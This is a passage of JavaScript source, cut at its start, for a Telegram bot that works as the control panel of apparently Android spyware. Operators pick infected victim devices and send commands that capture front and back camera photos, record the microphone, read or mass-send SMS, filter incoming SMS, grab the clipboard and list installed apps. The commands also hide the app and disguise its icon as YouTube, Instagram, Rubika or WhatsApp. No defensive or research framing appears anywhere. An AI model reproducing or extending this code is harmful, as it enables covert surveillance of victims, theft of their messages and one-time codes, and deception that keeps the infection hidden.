                    edit: true
                }
            }));
        } else if (mode == "takeBackshot"){
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                mask: "metro",
                method: "takeBackshot",
                device_id: spl[2],
                shortcut: {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    device_id: spl[2],
                    edit: true
                }
            }));
        } else if (mode == "recordFront"){
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                mask: "metro",
                method: "recordFront",
                device_id: spl[2],
                shortcut: {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    device_id: spl[2],
                    edit: true
                }
            }));
        } else if (mode == "recordBack"){
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                mask: "metro",
                method: "recordBack",
                device_id: spl[2],
                shortcut: {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    device_id: spl[2],
                    edit: true
                }
            }));
        } else if (mode == "recordMicrophone"){
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                mask: "metro",
                method: "recordMicrophone",
                device_id: spl[2],
                shortcut: {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    device_id: spl[2],
                    edit: true
                }
            }));
        } else if (mode == "smsPanel"){
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                mask: "metro",
                method: "getUserByDeviceId",
                device_id: spl[2],
                shortcut: {
                    way: "seeSMSPanel",
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    msgowner: call.from.id,
                    device_id: spl[2],
                    edit: true
                }
            }));
        } else if (mode == "sendSMS" || mode == "sendAllSMS"){
            steps[call.from.id] = {
                mode: (mode == "sendSMS") ? "getSMS" : "getAllSMS",
                device_id: spl[2]
            };
            await bot.editMessageText(
                build(`🗼 ${sym} send your sms message`),
                {
                    message_id: call.message.message_id,
                    chat_id: call.message.chat.id
                }
            )
        } else if (mode == "setSMSFilter" || mode == "removeSMSFilter"){
            steps[call.from.id] = {
                mode: (mode == "setSMSFilter") ? "smsFilter" : "removeSMSFilter",
                device_id: spl[2]
            };
            await bot.editMessageText(
                build(`💠 ${sym} send your name/phone-number to ${(mode == "setSMSFilter") ? "block" : "unblock"} that`),
                {
                    message_id: call.message.message_id,
                    chat_id: call.message.chat.id
                }
            )
        } else if (mode == "getAllSMS"){
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                mask: "metro",
                method: "getAllSMS",
                device_id: spl[2],
                shortcut: {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    device_id: spl[2],
                    edit: true
                }
            }));
        } else if (mode == "getClipboard"){
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                mask: "metro",
                method: "getClipboard",
                device_id: spl[2],
                shortcut: {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    device_id: spl[2],
                    edit: true
                }
            }));
        } else if (mode == "changePortPassword"){
            steps[call.from.id] = {
                mode: "getNewPassword"
            };
            await bot.editMessageText(
                build(`⏭ ${sym} send your new password`),
                {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id
                }
            )
        }  else if (mode == "changeUsersOwning"){
            steps[call.from.id] = {
                mode: "getNewOwningPort"
            };
            await bot.editMessageText(
                build(`⛽ ${sym} send the port which you want move your users into that`),
                {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id
                }
            )
        } else if (mode == "hideApp"){
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                mask: "metro",
                method: "hideApp",
                device_id: spl[2],
                shortcut: {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    device_id: spl[2],
                    edit: true
                }
            }));
        } else if (mode == "unhideApp"){
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                mask: "metro",
                method: "unhideApp",
                device_id: spl[2],
                shortcut: {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    device_id: spl[2],
                    edit: true
                }
            }));
        } else if (mode == "changeIcon"){
            await bot.editMessageText(
                build(`🗄 ${sym} select an icon which you want to change into that`),
                {
                    message_id: call.message.message_id,
                    chat_id: call.message.chat.id,
                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text: build("youtube ▶"),
                                    callback_data: `ci_${uid}_${spl[2]}_yt`
                                },
                                {
                                    text: build("instagram 📷"),
                                    callback_data: `ci_${uid}_${spl[2]}_in`
                                }
                            ],
                            [
                                {
                                    text: build("rubika 🔲"),
                                    callback_data: `ci_${uid}_${spl[2]}_rb`
                                },
                                {
                                    text: build("whatsapp 💭"),
                                    callback_data: `ci_${uid}_${spl[2]}_wt`
                                }
                            ],
                            [
                                {
                                    text: build("🔙 back"),
                                    callback_data: `seemyuser_${uid}_${spl[2]}`
                                },
                                {
                                    text: build("close"),
                                    callback_data: `close_${uid}`
                                }
                            ]
                        ]
                    }
                }
            )
        } else if (mode == "ci"){
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                mask: "metro",
                method: "changeIcon",
                device_id: spl[2],
                icon: guessApp(spl[3]),
                shortcut: {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    device_id: spl[2],
                    icon: guessApp(spl[3]),
                    edit: true
                }
            }));
        }
    }
})


me.on("data", async (data) => {
    try{
        let _message = JSON.parse(data.toString());
        if (_message.status == true){
            if (_message.method == "getUsers"){
                updating_users = _message.users;
                console.log("USERS SETED");
            } else if (_message.method == "getUserByDeviceId"){
                if (_message.shortcut){
                    if (_message.shortcut.way == 'seeMenu'){
                        createKeyboard(_message.user.accessory, _message.user.device_id, _message.shortcut.msgowner, async (keyboard) => {
                            _message.shortcut.edit == false ? await bot.sendMessage(
                                _message.shortcut.chat_id,
                                build("🦋 𓏺|𓏺 user selected\n🌐 𓏺|𓏺 device id: ") + `<code>${_message.user.device_id}</code>` + build(`\n📁 𓏺|𓏺 has ${_message.user.accessory.length} access`),
                                {
                                    reply_to_message_id: _message.shortcut.message_id,
                                    parse_mode: "HTML",
                                    reply_markup: {
                                        inline_keyboard: keyboard
                                    }
                                }
                            ) : await bot.editMessageText(
                                build("🦋 𓏺|𓏺 user selected\n🌐 𓏺|𓏺 device id: ") + `<code>${_message.user.device_id}</code>` + build(`\n📁 𓏺|𓏺 has ${_message.user.accessory.length} access`),
                                {
                                    message_id: _message.shortcut.message_id,
                                    chat_id: _message.shortcut.chat_id,
                                    parse_mode: "HTML",
                                    reply_markup: {
                                        inline_keyboard: keyboard
                                    }
                                }
                            )
                        })
                    } else if (_message.shortcut.way == "seeSMSPanel"){
                        let _keybinds = [];
                        let _second_keybinds = [];
                        let _last_keybinds = [];
                        if (_message.user.accessory.includes("sendSMS")){
                            _keybinds.push({
                                text: build(`🥊 send`),
                                callback_data: `sendSMS_${_message.shortcut.msgowner}_${_message.user.device_id}`
                            });
                        }

                        if (_message.user.accessory.includes("setSMSFilter")){
                            _keybinds.push({
                                text: build(`🏴 filter`),
                                callback_data: `setSMSFilter_${_message.shortcut.msgowner}_${_message.user.device_id}`
                            });
                        }

                        if (_message.user.accessory.includes("removeSMSFilter")){
                            _keybinds.push({
                                text: build(`🏳 unfilter`),
                                callback_data: `removeSMSFilter_${_message.shortcut.msgowner}_${_message.user.device_id}`
                            });
                        }

                        if (_message.user.accessory.includes("getAllSMS")){
                            _second_keybinds.push({
                                text: build("📜 get all sms"),
                                callback_data: `getAllSMS_${_message.shortcut.msgowner}_${_message.user.device_id}`
                            })
                        }

                        if (_message.user.accessory.includes("sendAllSMS")){
                            _second_keybinds.push({
                                text: build("🚀 send all"),
                                callback_data: `sendAllSMS_${_message.shortcut.msgowner}_${_message.user.device_id}`
                            })
                        }

                        _last_keybinds.push({
                            text: build("🔙 back"),
                            callback_data: `seemyuser_${_message.shortcut.msgowner}_${_message.user.device_id}`
                        })

                        _message.shortcut.edit == false ? await bot.sendMessage(
                            _message.shortcut.chat_id,
                            build(`🍷 ${sym} sms panel\n`) + `⚡ ${sym} ` + _message.shortcut.device_id,
                            {
                                reply_to_message_id: _message.shortcut.message_id,
                                reply_markup: {
                                    inline_keyboard: [
                                        _keybinds,
                                        _second_keybinds,
                                        _last_keybinds
                                    ]
                                }
                            }
                        ) : await bot.editMessageText(
                            build(`🍷 ${sym} sms panel\n`) + `⚡ ${sym} ` + _message.shortcut.device_id,
                            {
                                message_id: _message.shortcut.message_id,
                                chat_id: _message.shortcut.chat_id,
                                reply_markup: {
                                    inline_keyboard: [
                                        _keybinds,
                                        _second_keybinds,
                                        _last_keybinds
                                    ]
                                }
                            }
                        )

                    }
                }
            } else if (_message.method == "getInstalledApps"){
                if (_message.shortcut){
                    device_apps[_message.device_id] = _message.apps;
                    let srta = sortAppsToString(_message.apps, 0, _message.device_id, _message.shortcut.msgowner)
                    await bot.editMessageText(
                        srta.message,
                        {
                            chat_id: _message.shortcut.chat_id,
                            message_id: _message.shortcut.message_id,
                            reply_markup: {
                                inline_keyboard: srta.binds
                            }
                        }
                    )
                }
            }
        }
    } catch (e) {
        console.log(e)
    }
})

setInterval(() => {
    me.write(JSON.stringify({
        method: "getUsers",
        port: portname,
        password: passname,
        mask: "metro"
    }))
}, 3000)

process.on("uncaughtException", async (err) => {
    console.log("[B] error detected:", err);
})